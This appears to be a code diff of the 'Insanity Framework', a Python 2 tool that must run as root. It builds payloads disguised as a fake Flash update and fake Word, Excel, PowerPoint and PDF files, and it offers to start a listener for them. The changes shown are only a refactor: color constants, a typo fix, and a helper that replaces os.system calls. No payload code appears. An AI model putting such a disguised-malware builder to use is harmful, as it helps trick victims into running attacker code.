@@ -8,13 +8,20 @@ import os
 import sys
 import time
 import os
-import getpass
+from bin.settings import exec_com
+
+
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
 
 if not os.geteuid() == 0:
     sys.exit('Insanity must be run as root')
 
+
 def clear():
-    os.sytem('clear')
+    os.system('clear')
+
+
 def help():
     print '''
 - [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ -
@@ -25,8 +32,10 @@ def help():
 ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}
 '''.format(BLUE, END)
 
+
 def option():
    print '! {0}[{1}1{0}]{1} Aᴅᴏʙᴇ Fʟᴀsʜ Uᴘᴅᴀᴛᴇ !'.format(RED, WHITE) + '\n' + '! {0}[{1}2{0}]{1} Fᴀᴋᴇ Wᴏʀᴅ ᴅᴏᴄx !'.format(RED, WHITE) + '\n' + '! {0}[{1}3{0}]{1} Fake Excel xlsx !'.format(RED, WHITE) + '\n' + '! {0}[{1}4{0}]{1} Fᴀᴋᴇ Pᴏᴡᴇʀᴘᴏɪɴᴛ ᴘᴘᴛx !'.format(RED, WHITE) + '\n' + '! {0}[{1}5{0}]{1} Fᴀᴋᴇ Aᴄʀᴏʙᴀᴛ ᴘᴅꜰ !'.format(RED, WHITE) + '\n'
+
 
 def begin():
     os.system('python enc.py')
@@ -62,13 +71,10 @@ def begin():
         f.close()	
     template.close()
 
+
 if not os.geteuid() == 0:
     sys.exit('Script must be run as root')
 
-def clear():
-    os.system('clear')
-
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 def heading():
     os.system('clear')
@@ -97,6 +103,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
  -- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ  --                                Version: 1.0 Stable
 ''' + BLUE + '''* -> Cʜᴏᴏsᴇ ᴀ ᴘᴀʏʟᴏᴀᴅ ꜰᴏʀᴍᴀᴛ ꜰʀᴏᴍ ᴍᴇɴᴜ: <- *
 ''' + '\n' + END)
+
 
 def optionBanner():
     print '! {0}[{1}D{0}]{1} Dᴇꜰᴀᴜʟᴛ (ꜰʟᴀsʜ ᴜᴘᴅᴀᴛᴇ)  - {0}[{1}L{0}]{1} Lɪsᴛ Aʟʟ Aᴠᴀɪʟᴀʙʟᴇs !'.format(RED, WHITE) + '\n' + '                                                            {0}[{1}H{0}]{1} ʜᴇʟᴘ  {0}[{1}Q{0}]{1} ǫᴜɪᴛ'.format(RED, WHITE)
@@ -130,6 +137,7 @@ $$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                            i$" $$$$  $$#"`  """     W$$$$
 ''' + END)
 
+
 def asker():
     header = ('{0}InSaNiTy{1} > {2}'.format(RED, WHITE, END))
     choice = raw_input(header)
@@ -161,7 +169,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -179,7 +187,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -197,7 +205,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)        
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -215,7 +223,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -233,7 +241,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)        
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -251,7 +259,7 @@ def asker():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
         listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
         if listen.upper() == 'Y':
-            os.system('python2.7 striker.py')
+            exec_com('striker.py')
             sys.exit(0)
         else:
             sys.exit(0)
@@ -267,10 +275,10 @@ def asker():
 	option()
         asker() 
     elif choice.upper() == 'BACK':
-	os.system('python2.7 insanity.py')
+	exec_com('insanity.py')
         sys.exit(0)
     else:             
-	clear()            
+	clear()
 	print 'Iɴᴠᴀʟɪᴅ Oᴘᴛɪᴏɴ'
         time.sleep(2)
         main()
@@ -313,7 +321,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -331,7 +339,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -349,7 +357,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -367,7 +375,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -385,7 +393,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -403,7 +411,7 @@ def main():
                 ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                 listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                 if listen.upper() == 'Y':
-                    os.system('python2.7 striker.py')
+                    exec_com('striker.py')
                     sys.exit(0)
                 else:
                     sys.exit(0)
@@ -419,22 +427,19 @@ def main():
 		option()
                 asker() 
             elif choice.upper() == 'BACK':
-		os.system('python2.7 insanity.py')
+		exec_com('insanity.py')
                 sys.exit(0)
             else:             
 		clear()            
 		print 'Iɴᴠᴀʟɪᴅ Oᴘᴛɪᴏɴ'
                 time.sleep(2)
                 main()
- 
 
     except KeyboardInterrupt:
 	clear()
 	pp()
         sys.exit(0)
 
+
 if __name__ == '__main__':
-
     main()
-
-
